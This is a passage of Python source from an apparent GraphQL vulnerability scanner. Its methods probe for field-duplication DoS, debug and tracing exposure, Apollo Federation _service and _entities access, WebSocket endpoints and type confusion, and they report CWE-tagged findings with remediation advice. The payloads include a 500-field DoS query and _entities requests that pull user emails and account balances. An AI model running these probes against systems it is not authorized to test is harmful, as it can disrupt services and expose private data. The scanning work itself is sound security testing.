    async def _test_field_duplication_dos(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test for field duplication DoS.

        Repeating the same field without aliases causes server to execute
        resolver multiple times. Combined with expensive resolvers, this
        can cause significant DoS.
        """
        findings = []

        logger.info("📋 Testing field duplication DoS...")

        # Generate query with repeated fields (no aliases = same field)
        # Some servers merge, some don't
        repeated_fields = " ".join(["__typename"] * 500)
        dup_query = f"query {{ {repeated_fields} }}"

        await rate_limiter.acquire()

        try:
            start_time = time.time()
            response = await client.post(
                graphql_url,
                json={"query": dup_query},
                headers={"Content-Type": "application/json"},
                timeout=15.0
            )
            elapsed = time.time() - start_time

            if response.status_code == 200:
                data = response.json()

                if isinstance(data, dict) and "data" in data:
                    # Check response size - if fields weren't merged, will be large
                    response_str = str(data)

                    # If response time > 3s or response > 10KB, potential issue
                    if elapsed > 3.0 or len(response_str) > 10000:
                        findings.append(Finding(
                            name="GraphQL Field Duplication DoS",
                            severity=Severity.MEDIUM,
                            confidence_score=70.0,
                            description="Server processes duplicate fields without merging. "
                                       "With expensive resolvers, this enables DoS.",
                            endpoint=graphql_url,
                            evidence=[
                                "500 duplicate fields accepted",
                                f"Response time: {elapsed:.2f}s",
                                f"Response size: {len(response_str)} chars",
                            ],
                            cwe_id="CWE-400",
                            cvss_score=5.3,
                            remediation="Implement field duplication limits. Consider merging "
                                       "identical field requests.",
                        ))

        except httpx.TimeoutException:
            findings.append(Finding(
                name="GraphQL Field Duplication DoS - Timeout",
                severity=Severity.HIGH,
                confidence_score=85.0,
                description="Field duplication caused timeout - DoS confirmed.",
                endpoint=graphql_url,
                evidence=["500 duplicate fields caused timeout"],
                cwe_id="CWE-400",
                cvss_score=7.5,
                remediation="Implement field duplication limits.",
            ))
        except Exception as e:
            logger.debug(f"Field duplication test error: {e}")

        return findings

    async def _test_extension_exposure(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test for GraphQL extensions/debug information exposure.

        Checks for:
        1. Apollo tracing enabled
        2. Error stack traces
        3. Query timing information
        4. Internal resolver paths
        """
        findings = []

        logger.info("🔍 Testing extension/debug info exposure...")

        # Test query that might trigger debug info
        test_query = """
        query ExtensionTest {
            __typename
        }
        """

        await rate_limiter.acquire()

        try:
            response = await client.post(
                graphql_url,
                json={"query": test_query},
                headers={
                    "Content-Type": "application/json",
                    "x-apollo-tracing": "1",
                    "apollo-require-preflight": "true",
                }
            )

            if response.status_code == 200:
                data = response.json()

                if isinstance(data, dict):
                    extensions = data.get("extensions", {})

                    if extensions:
                        exposed_info = []
                        severity = "LOW"

                        # Apollo Tracing
                        if "tracing" in extensions:
                            exposed_info.append("Apollo tracing (execution timing)")
                            severity = "MEDIUM"

                        # Cache hints
                        if "cacheControl" in extensions:
                            exposed_info.append("Cache control hints")

                        # Error codes/paths
                        if "code" in extensions or "path" in extensions:
                            exposed_info.append("Error codes/paths")

                        # Performance metrics
                        if "metrics" in extensions or "timing" in extensions:
                            exposed_info.append("Performance metrics")
                            severity = "MEDIUM"

                        # Query plan (federation)
                        if "queryPlan" in extensions or "ftv1" in extensions:
                            exposed_info.append("Query execution plan (Federation)")
                            severity = "MEDIUM"

                        if exposed_info:
                            findings.append(Finding(
                                name="GraphQL Extension Information Exposure",
                                severity=severity,
                                confidence_score=85.0,
                                description="GraphQL response includes debug/tracing extensions. "
                                           "These can reveal internal architecture and timing.",
                                endpoint=graphql_url,
                                evidence=[
                                    f"Extensions exposed: {', '.join(exposed_info)}",
                                    f"Extension keys: {list(extensions.keys())}",
                                ],
                                cwe_id="CWE-200",
                                cvss_score=4.3 if severity == "MEDIUM" else 2.7,
                                remediation="Disable Apollo tracing and debug extensions in production. "
                                           "Strip extensions from responses.",
                            ))

                    # Check for stack traces in errors
                    errors = data.get("errors", [])
                    for error in errors:
                        if isinstance(error, dict):
                            error_str = str(error).lower()
                            if any(x in error_str for x in ["stack", "trace", "line ", "file ", ".js:", ".ts:"]):
                                findings.append(Finding(
                                    name="GraphQL Stack Trace Exposure",
                                    severity=Severity.MEDIUM,
                                    confidence_score=85.0,
                                    description="GraphQL errors include stack traces revealing internal paths.",
                                    endpoint=graphql_url,
                                    evidence=[f"Error contains stack trace: {error_str[:200]}"],
                                    cwe_id="CWE-209",
                                    cvss_score=5.3,
                                    remediation="Sanitize error messages. Remove stack traces in production.",
                                ))
                                break

        except Exception as e:
            logger.debug(f"Extension exposure test error: {e}")

        return findings

    async def _test_apollo_federation_attacks(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test for Apollo Federation vulnerabilities.

        Checks:
        1. _service query exposure (subgraph SDL)
        2. _entities query enumeration
        3. Subgraph URL leakage
        """
        findings = []

        logger.info("🔷 Testing Apollo Federation vulnerabilities...")

        # Test 1: _service query (exposes subgraph SDL)
        service_query = """
        query {
            _service {
                sdl
            }
        }
        """

        await rate_limiter.acquire()

        try:
            response = await client.post(
                graphql_url,
                json={"query": service_query},
                headers={"Content-Type": "application/json"}
            )

            if response.status_code == 200:
                data = response.json()

                if isinstance(data, dict) and "data" in data:
                    service_data = data["data"]
                    if service_data and "_service" in service_data:
                        sdl = service_data["_service"].get("sdl", "")
                        if sdl:
                            findings.append(Finding(
                                name="Apollo Federation SDL Exposed",
                                severity=Severity.MEDIUM,
                                confidence_score=85.0,
                                description="_service query exposes full subgraph SDL schema. "
                                           "Reveals internal types, directives, and architecture.",
                                endpoint=graphql_url,
                                evidence=[
                                    "SDL schema retrieved via _service",
                                    f"SDL length: {len(sdl)} chars",
                                    f"Preview: {sdl[:200]}...",
                                ],
                                cwe_id="CWE-200",
                                cvss_score=5.3,
                                remediation="Block _service query in production. Use Apollo Router's "
                                           "query security features.",
                            ))

        except Exception as e:
            logger.debug(f"Federation _service test error: {e}")

        # Test 2: _entities query (reference resolver)
        entities_queries = [
            """
            query {
                _entities(representations: [{__typename: "User", id: "1"}]) {
                    ... on User { id email }
                }
            }
            """,
            """
            query {
                _entities(representations: [{__typename: "Account", id: "1"}]) {
                    ... on Account { id balance }
                }
            }
            """,
        ]

        for query in entities_queries:
            await rate_limiter.acquire()

            try:
                response = await client.post(
                    graphql_url,
                    json={"query": query},
                    headers={"Content-Type": "application/json"}
                )

                if response.status_code == 200:
                    data = response.json()

                    if isinstance(data, dict) and "data" in data:
                        entities = data["data"].get("_entities")
                        if entities and isinstance(entities, list) and len(entities) > 0:
                            # _entities returned data - direct access to entity resolvers
                            entity_data = entities[0]
                            if entity_data and entity_data.get("id"):
                                findings.append(Finding(
                                    name="Apollo Federation Entity Access",
                                    severity=Severity.HIGH,
                                    confidence_score=75.0,
                                    description="_entities query allows direct entity resolution. "
                                               "Can bypass gateway-level authorization.",
                                    endpoint=graphql_url,
                                    evidence=[
                                        "Entity resolved via _entities",
                                        f"Entity data: {str(entity_data)[:100]}",
                                    ],
                                    cwe_id="CWE-639",
                                    cvss_score=7.5,
                                    remediation="Implement entity-level authorization in subgraphs. "
                                               "Block direct _entities access from clients.",
                                ))
                                break

            except Exception as e:
                logger.debug(f"Federation _entities test error: {e}")

        return findings

    async def _test_websocket_subscription(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test for WebSocket subscription security issues.

        Note: Full WebSocket testing requires different approach.
        This tests basic WebSocket endpoint exposure.
        """
        findings = []

        logger.info("🔌 Testing WebSocket subscription security...")

        # Common WebSocket paths
        ws_paths = [
            "/graphql",
            "/subscriptions",
            "/ws",
            "/graphql/subscriptions",
            "/api/graphql/ws",
        ]

        base_url = graphql_url.rsplit("/", 1)[0]

        for path in ws_paths:
            await rate_limiter.acquire()

            try:
                # Check if WebSocket upgrade is supported
                url = f"{base_url}{path}"
                response = await client.get(
                    url,
                    headers={
                        "Upgrade": "websocket",
                        "Connection": "Upgrade",
                        "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
                        "Sec-WebSocket-Version": "13",
                    }
                )

                # 101 Switching Protocols or 400/426 with WS-related error
                if response.status_code == 101:
                    findings.append(Finding(
                        name="GraphQL WebSocket Subscriptions Available",
                        severity=Severity.INFO,
                        confidence_score=85.0,
                        description="WebSocket endpoint accepts connections. "
                                   "Verify subscription authorization is enforced.",
                        endpoint=url,
                        evidence=[
                            "WebSocket upgrade accepted (101)",
                            f"Path: {path}",
                        ],
                        cwe_id="CWE-306",
                        cvss_score=0.0,
                        remediation="Ensure WebSocket connections require authentication. "
                                   "Implement per-subscription authorization.",
                    ))
                    break

                elif response.status_code in [400, 426]:
                    # Check response for WS-related content
                    text = response.text.lower()
                    if "websocket" in text or "upgrade" in text:
                        findings.append(Finding(
                            name="GraphQL WebSocket Endpoint Detected",
                            severity=Severity.INFO,
                            confidence_score=70.0,
                            description="WebSocket endpoint present but requires proper handshake.",
                            endpoint=url,
                            evidence=[
                                f"Status: {response.status_code}",
                                "WebSocket-related response",
                            ],
                            cwe_id="CWE-200",
                            cvss_score=0.0,
                            remediation="Verify WebSocket subscription authorization.",
                        ))
                        break

            except Exception as e:
                logger.debug(f"WebSocket test error: {e}")

        return findings

    async def _test_type_confusion(
        self,
        client: httpx.AsyncClient,
        graphql_url: str,
        rate_limiter: RateLimiter,
    ) -> list[Finding]:
        """
        Test for type confusion attacks.

        Interface/Union types can be exploited when authorization
        is implemented on the interface but not all implementations.
        """
        findings = []

        logger.info("🔀 Testing type confusion attacks...")

        # Get interfaces and unions from schema
        introspection = """
        query {
            __schema {
                types {
                    name
                    kind
                    possibleTypes { name }
                    interfaces { name }
                }
            }
        }
        """

        await rate_limiter.acquire()

        try:
            response = await client.post(
                graphql_url,
                json={"query": introspection},
                headers={"Content-Type": "application/json"}
            )

            if response.status_code == 200:
                data = response.json()

                if isinstance(data, dict) and "data" in data:
                    schema = data["data"].get("__schema", {})
                    types = schema.get("types", [])

                    # Find interfaces and unions with multiple implementations
                    for t in types:
                        kind = t.get("kind", "")
                        name = t.get("name", "")
                        possible_types = t.get("possibleTypes") or []

                        if name.startswith("__"):
                            continue

                        if kind in ["INTERFACE", "UNION"] and len(possible_types) > 1:
                            # Test if we can query each implementation differently
                            impl_names = [p.get("name") for p in possible_types]

                            # Generate inline fragment query
                            fragments = " ".join([
                                f"... on {impl} {{ __typename }}"
                                for impl in impl_names
                            ])

                            # Find a query that returns this interface/union
                            for query_type in types:
                                if query_type.get("name") == "Query":
                                    for field in query_type.get("fields") or []:
                                        field_type = str(field).lower()
                                        if name.lower() in field_type:
                                            test_query = f"""
                                            query {{
                                                {field.get('name')} {{
                                                    {fragments}
                                                }}
                                            }}
                                            """

                                            await rate_limiter.acquire()

                                            try:
                                                resp = await client.post(
                                                    graphql_url,
                                                    json={"query": test_query},
                                                    headers={"Content-Type": "application/json"}
                                                )

                                                if resp.status_code == 200:
                                                    result = resp.json()
                                                    if isinstance(result, dict) and "data" in result and result["data"]:
                                                        findings.append(Finding(
                                                            name="GraphQL Type Confusion Risk",
                                                            severity=Severity.LOW,
                                                            confidence_score=60.0,
                                                            description=f"{kind} type '{name}' has {len(possible_types)} "
                                                                       f"implementations. Verify authorization on each.",
                                                            endpoint=graphql_url,
                                                            evidence=[
                                                                f"Type: {name} ({kind})",
                                                                f"Implementations: {', '.join(impl_names)}",
                                                            ],
                                                            cwe_id="CWE-863",
                                                            cvss_score=3.7,
                                                            remediation="Implement authorization on each concrete type, "
                                                                       "not just the interface/union.",
                                                        ))
                                                        break

                                            except Exception as e:
                                                logger.debug(f"Type confusion test error: {e}")

                                            break
                                    break

        except Exception as e:
            logger.debug(f"Type confusion introspection error: {e}")

        return findings
